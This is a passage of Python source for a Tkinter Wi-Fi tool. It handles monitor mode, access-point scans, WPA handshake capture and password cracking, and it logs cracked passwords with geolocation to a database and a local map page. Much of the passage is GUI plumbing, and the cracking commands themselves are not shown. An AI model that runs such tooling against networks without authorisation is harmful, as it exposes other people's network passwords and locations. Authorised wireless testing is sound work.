                     log_to_gui(f"Error direct killing HTTP server: {e_direct_kill}")
            except Exception as e_term:
                log_to_gui(f"Error stopping HTTP server: {e_term}")
            finally:
                self.http_server_process = None

    def open_website(self):
        script_dir = os.path.dirname(os.path.abspath(__file__)) 
        site_html_filename = "index.html"
        site_dir = os.path.join(script_dir, "wifi-mapper")
        site_html_file_path = os.path.join(site_dir, site_html_filename)

        log_to_gui(f"Preparing to open website: {site_html_file_path}")
        try:
            export_table_to_json(WIFI_DB_FILE, "networks", "networks.json")
        except Exception as e_export:
            log_to_gui(f"Error exporting table to JSON: {e_export}")
            messagebox.showerror("Export Error", f"Could not export table to JSON: {e_export}")
            return

        server_ready_for_browser = False
        if self.http_server_process and self.http_server_process.poll() is None:
            log_to_gui("Internal HTTP server is already running.")
            server_ready_for_browser = True
        elif not is_port_in_use(8000):
            log_to_gui("Port 8000 is free. Attempting to start internal HTTP server.")
            if self.start_http_server(): 
                server_ready_for_browser = True
                time.sleep(0.5) 
            else:
                log_to_gui("Failed to start internal HTTP server. Browser might not connect.")
        elif is_port_in_use(8000):
            log_to_gui("Port 8000 is already in use (possibly by an external server).")
            server_ready_for_browser = True

        if not os.path.exists(site_html_file_path):
            log_to_gui(f"Website HTML file not found: {site_html_file_path}")
            messagebox.showerror("Website Error", f"HTML file not found at expected location:\n{site_html_file_path}")
            return
        
        if server_ready_for_browser:
            try:
                webbrowser.open_new_tab(f"http://localhost:8000/{site_html_filename}")
                log_to_gui(f"Opened browser to http://localhost:8000/{site_html_filename}")
            except Exception as e_web:
                log_to_gui(f"Error opening website in browser: {e_web}")
                messagebox.showerror("Browser Error", f"Could not open website in browser:\n{e_web}")
        else:
            log_to_gui("Internal HTTP server failed to start and port was free. Browser may not connect.")
            try:
                webbrowser.open_new_tab(f"http://localhost:8000/{site_html_filename}")
                log_to_gui(f"Attempted to open browser despite server start issues to http://localhost:8000/{site_html_filename}")
            except Exception as e_web_fallback:
                 log_to_gui(f"Fallback browser open error: {e_web_fallback}")


    def handle_monitor_result(self, iface_name):
        self.monitor_interface = iface_name
        self.pending_monitor_start_iface = None 
        if iface_name:
            self.update_status(f"Monitor mode active on: {iface_name}")
            self.log_message(f"Monitor mode successfully enabled on {iface_name}.", "SUCCESS")
            self.interface_combo['values'] = [iface_name] 
            self.interface_combo.set(iface_name)
            self.interface_combo.config(state=tk.DISABLED) 
            self.refresh_interfaces_button.config(state=tk.DISABLED)
            self.monitor_start_button.config(text="■ Stop Mon", command=self.stop_monitor_mode, state=tk.NORMAL)
            for btn in [self.scan_button, self.check_clients_button, self.capture_button]:
                btn.config(state=tk.NORMAL)
        else:
            self.update_status("Failed to start monitor mode.")
            self.log_message("Monitor mode activation failed.", "ERROR")
            self.interface_combo.config(state='readonly') 
            self.refresh_interfaces_button.config(state=tk.NORMAL)
            self.monitor_start_button.config(text="▶ Start Mon", command=self.start_monitor_mode, state=tk.NORMAL)
            for btn in [self.scan_button, self.check_clients_button, self.capture_button]:
                btn.config(state=tk.DISABLED)
            self.refresh_interfaces() 

    def handle_monitor_stopped(self, result_tuple):
        success, original_iface_name = result_tuple
        pending_iface_to_start_on = self.pending_monitor_start_iface 
        self.pending_monitor_start_iface = None

        if success:
            self.monitor_interface = None 
            self.update_status("Monitor mode stopped.")
            self.log_message(f"Monitor mode stopped on {original_iface_name}.", "SUCCESS")
        else:
            self.update_status(f"Failed to stop monitor mode on {original_iface_name}.")
            self.log_message(f"Stopping monitor mode on {original_iface_name} failed.", "ERROR")

        self.monitor_start_button.config(text="▶ Start Mon", command=self.start_monitor_mode, state=tk.NORMAL)
        self.interface_combo.config(state='readonly')
        self.refresh_interfaces_button.config(state=tk.NORMAL)
        self.refresh_interfaces() 
        for btn in [self.scan_button, self.check_clients_button, self.capture_button, self.stop_scan_button, self.stop_capture_button]:
            btn.config(state=tk.DISABLED)

        if pending_iface_to_start_on and success: 
            log_to_gui(f"Previous monitor stopped. Now attempting to start on {pending_iface_to_start_on}.")
            self.interface_combo.set(pending_iface_to_start_on) 
            self.start_monitor_mode() 
        elif pending_iface_to_start_on and not success:
            log_to_gui(f"Failed to stop previous monitor mode. Cannot automatically start new monitor on {pending_iface_to_start_on}.")


    def handle_scan_result(self, scanned_networks):
        self.log_message(f"Network scan finished. Found {len(scanned_networks)} access points.")
        self.current_scan_results = scanned_networks 
        self.network_tree.delete(*self.network_tree.get_children()) 
        self.network_item_map.clear() 

        for net in scanned_networks:
            if not net.get("bssid"): continue 
            vals = (
                net.get("ssid", "N/A"), net["bssid"], str(net.get("power", "-")),
                str(net.get("channel", "-")), net.get("encryption", "Unknown"),
                "?", "?"
            )
            iid = self.network_tree.insert("", "end", values=vals)
            self.network_item_map[net["bssid"]] = iid 

        has_results = bool(scanned_networks)
        actions_state = tk.NORMAL if has_results and self.monitor_interface else tk.DISABLED
        
        if self.monitor_interface: 
            self.scan_button.config(state=tk.NORMAL) 
        self.stop_scan_button.config(state=tk.DISABLED) 
        for btn in [self.check_clients_button, self.capture_button]: 
            btn.config(state=actions_state)
        
        
    def handle_client_check_result(self, result_tuple):
        bssid, found, status_msg = result_tuple
        iid = self.network_item_map.get(bssid)
        if iid and self.network_tree.exists(iid):
            self.network_tree.set(iid, "Cli", status_msg) 

    def handle_capture_result(self, result_tuple):
        bssid, captured, status_msg, cap_filepath = result_tuple
        item_id_in_tree = self.network_item_map.get(bssid)

        if item_id_in_tree and self.network_tree.exists(item_id_in_tree):
            self.network_tree.set(item_id_in_tree, "HS", status_msg) 
        
        self.stop_capture_button.config(state=tk.DISABLED)
        if self.monitor_interface:
            for btn in [self.capture_button, self.check_clients_button, self.scan_button]:
                btn.config(state=tk.NORMAL)

        net_info_to_save = None
        if self.current_scan_results:
            net_info_to_save = next((n.copy() for n in self.current_scan_results if n.get("bssid") == bssid), None)

        if not net_info_to_save and item_id_in_tree and self.network_tree.exists(item_id_in_tree):
            try:
                tree_values = self.network_tree.item(item_id_in_tree, 'values')
                if len(tree_values) >= 5: 
                    net_info_to_save = {
                        "bssid": tree_values[1],
                        "ssid": tree_values[0],
                        "power": int(tree_values[2]) if tree_values[2] and tree_values[2].lstrip('-').isdigit() else None,
                        "channel": tree_values[3] if tree_values[3] and tree_values[3] != '-' else None,
                        "encryption": tree_values[4]
                    }
                    log_to_gui(f"Network data for {bssid} (capture result) retrieved from Treeview for DB save.")
            except (ValueError, IndexError, TypeError) as e:
                log_to_gui(f"Warning: Could not fully parse network data for {bssid} from Treeview for capture result save: {e}")
        
        if not net_info_to_save:
            ssid_from_tree = "UnknownSSID" 
            if item_id_in_tree and self.network_tree.exists(item_id_in_tree):
                try: ssid_from_tree = self.network_tree.item(item_id_in_tree, 'values')[0]
                except (IndexError, TypeError): pass
            net_info_to_save = {"bssid": bssid, "ssid": ssid_from_tree}
            log_to_gui(f"Minimal network data for {bssid} created for DB save (capture result).")

        if captured:
            self.log_message(f"Handshake capture for {bssid} reported as successful: {status_msg}.", "SUCCESS")
            net_info_to_save["handshake_captured"] = 1
            if cap_filepath and os.path.exists(cap_filepath): 
                net_info_to_save["handshake_filepath"] = os.path.abspath(cap_filepath)
            self.refresh_handshake_list() 
        else:
            self.log_message(f"Handshake capture for {bssid} reported as failed: {status_msg}.", "WARNING")
            net_info_to_save.pop("handshake_captured", None) 
            net_info_to_save.pop("handshake_filepath", None)

        self.network_pending_db_save = net_info_to_save
        log_to_gui(f"Capture attempt for {bssid} processed. Status: {status_msg}. Triggering location check for DB update.")
        threading.Thread(target=get_location_task, daemon=True).start()

         
    def handle_location_result(self, location_data_tuple):
        lat, lon = location_data_tuple
        try: self.latitude = float(lat) if lat is not None else None
        except (ValueError, TypeError): self.latitude = None
        try: self.longitude = float(lon) if lon is not None else None
        except (ValueError, TypeError): self.longitude = None

        status_msg = f"Location acquired: Lat={self.latitude:.6f}, Lon={self.longitude:.6f}" if self.latitude and self.longitude else "Location not acquired."
        self.update_status(status_msg)
        self.log_message(status_msg, "SUCCESS" if self.latitude and self.longitude else "WARNING")

        if self.network_pending_db_save == "ALL_SCANNED_RESULTS":
            if self.current_scan_results: 
                log_to_gui(f"Preparing to save/update {len(self.current_scan_results)} scanned networks in DB with current location.")
                networks_to_save_all = []
                for net_data in self.current_scan_results:
                    if not net_data.get("bssid"): continue
                    net_copy = { 
                        "bssid": net_data.get("bssid"), "ssid": net_data.get("ssid"),
                        "power": net_data.get("power"), "channel": net_data.get("channel"),
                        "encryption": net_data.get("encryption"),
                    }
                    networks_to_save_all.append(net_copy)

                if networks_to_save_all:
                    threading.Thread(target=save_scan_data_task, args=(networks_to_save_all, self.latitude, self.longitude), daemon=True).start()
            else:
                log_to_gui("Location result received, but no 'ALL_SCANNED_RESULTS' pending or no current scan results.")
            self.network_pending_db_save = None 

        elif isinstance(self.network_pending_db_save, dict): 
            net_to_save_single = self.network_pending_db_save
            self.network_pending_db_save = None 
            log_to_gui(f"Location result received. Saving single network {net_to_save_single.get('bssid')} to DB.")
            threading.Thread(target=save_scan_data_task, args=([net_to_save_single], self.latitude, self.longitude), daemon=True).start()
        else: 
            self.network_pending_db_save = None 
    
    def handle_save_result(self, result_tuple):
        success, detail = result_tuple
        msg = f"Database save/update successful: {detail}." if success else f"Database save/update failed: {detail}."
        self.update_status(msg)
        self.log_message(msg, "SUCCESS" if success else "ERROR")

    def handle_handshake_files_loaded(self, hs_files_list):
        current_tree_iids = set(self.handshake_tree.get_children()) 
        loaded_filepaths_from_task = set()
        new_handshake_item_map = {} 

        for hs_data in hs_files_list:
            filepath_key = hs_data["filepath"] 
            loaded_filepaths_from_task.add(filepath_key)
            new_handshake_item_map[filepath_key] = hs_data 

            vals_to_display = (hs_data["filename"], hs_data["ssid"], hs_data["bssid"], hs_data["status"])

            if self.handshake_tree.exists(filepath_key): 
                current_vals_in_tree = self.handshake_tree.item(filepath_key, 'values')
                if current_vals_in_tree != vals_to_display: 
                    self.handshake_tree.item(filepath_key, values=vals_to_display)
            else: 
                self.handshake_tree.insert("", "end", values=vals_to_display, iid=filepath_key)

        self.handshake_item_map = new_handshake_item_map 

        iids_to_remove_from_tree = current_tree_iids - loaded_filepaths_from_task
        if iids_to_remove_from_tree:
            for iid_remove in iids_to_remove_from_tree:
                if self.handshake_tree.exists(iid_remove):
                    self.handshake_tree.delete(iid_remove)

        has_items_in_list = bool(self.handshake_item_map)
        self.crack_button.config(state=tk.NORMAL if has_items_in_list else tk.DISABLED)
        
        any_task_still_cracking = any(
            "Cracking..." in d.get("status", "") or "Stopping..." in d.get("status", "")
            for d in self.handshake_item_map.values()
        )
        self.stop_crack_button.config(state=tk.NORMAL if any_task_still_cracking else tk.DISABLED)
        
        self.update_status(f"Handshake list updated ({len(self.handshake_item_map)} files).")
        self.refresh_handshakes_button.config(state=tk.NORMAL) 


    def handle_crack_result(self, crack_result_tuple):
        bssid, key, status_msg, cap_filepath_key = crack_result_tuple
        
        if self.handshake_tree.exists(cap_filepath_key):
            self.handshake_tree.set(cap_filepath_key, "Status", status_msg)
        if cap_filepath_key in self.handshake_item_map:
            self.handshake_item_map[cap_filepath_key]["status"] = status_msg

        if key:
            self.log_message(f"Password found for {bssid}: {key}. Status: {status_msg}", "SUCCESS")
            db_data_to_save = {
                "bssid": bssid,
                "password": key,
                "handshake_captured": 1, 
                "handshake_filepath": os.path.abspath(cap_filepath_key) if os.path.exists(cap_filepath_key) else None
            }

            if cap_filepath_key in self.handshake_item_map and self.handshake_item_map[cap_filepath_key].get("ssid") != "UnknownSSID":
                db_data_to_save["ssid"] = self.handshake_item_map[cap_filepath_key]["ssid"]

            self.network_pending_db_save = db_data_to_save
            log_to_gui(f"Cracked password for {bssid}. Triggering location for DB update.")
            threading.Thread(target=get_location_task, daemon=True).start()

        elif "Not Found" in status_msg or "Failed" in status_msg or "Timeout" in status_msg or "Error" in status_msg:
            self.log_message(f"Cracking for {bssid} resulted in: {status_msg}.", "WARNING" if "Timeout" in status_msg else "ERROR")
            if os.path.exists(cap_filepath_key): 
                db_data_attempt_failed = {
                    "bssid": bssid,
                    "handshake_captured": 1, 
                    "handshake_filepath": os.path.abspath(cap_filepath_key)
                }
                if cap_filepath_key in self.handshake_item_map and self.handshake_item_map[cap_filepath_key].get("ssid") != "UnknownSSID":
                     db_data_attempt_failed["ssid"] = self.handshake_item_map[cap_filepath_key]["ssid"]
                

        any_task_still_cracking = any(
            "Cracking..." in d.get("status", "") or "Stopping..." in d.get("status", "")
            for d in self.handshake_item_map.values()
        )
        self.crack_button.config(state=tk.NORMAL if self.handshake_item_map else tk.DISABLED)
        self.refresh_handshakes_button.config(state=tk.NORMAL)
        self.stop_crack_button.config(state=tk.NORMAL if any_task_still_cracking else tk.DISABLED)
        
        if not any_task_still_cracking:
            self.update_status("All cracking tasks finished or stopped.")


    def on_closing(self):
        log_to_gui("Exiting application...")
        procs_to_stop = {"Scan": scan_process_obj, "Capture": capture_process_obj}
        for bssid_proc, proc_obj_val in list(crack_processes.items()): 
            procs_to_stop[f"Crack ({bssid_proc})"] = proc_obj_val
        
        for name, proc_obj in procs_to_stop.items():
            if proc_obj:
                terminate_process(proc_obj, name)
        crack_processes.clear() 

        if self.monitor_interface:
            try:
                log_to_gui(f"Stopping monitor mode on {self.monitor_interface} before exit...")
                subprocess.run(["sudo", "airmon-ng", "stop", self.monitor_interface], check=False, timeout=10, capture_output=True)
                log_to_gui(f"Monitor mode on {self.monitor_interface} presumably stopped.")
            except Exception as e_mon_stop:
                log_to_gui(f"Error stopping monitor mode during exit: {e_mon_stop}")
        
        self.stop_http_server()

        self.destroy()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("WARNING: Not running as root. Sudo is recommended for full functionality.")
    try:
        from PIL import Image, ImageTk 
    except ImportError:
        print("WARNING: Pillow library (PIL/Pillow) not found. Logos and some image operations may not display/work correctly. Install with: pip install Pillow")

    app = WifiToolApp()
    app.mainloop()
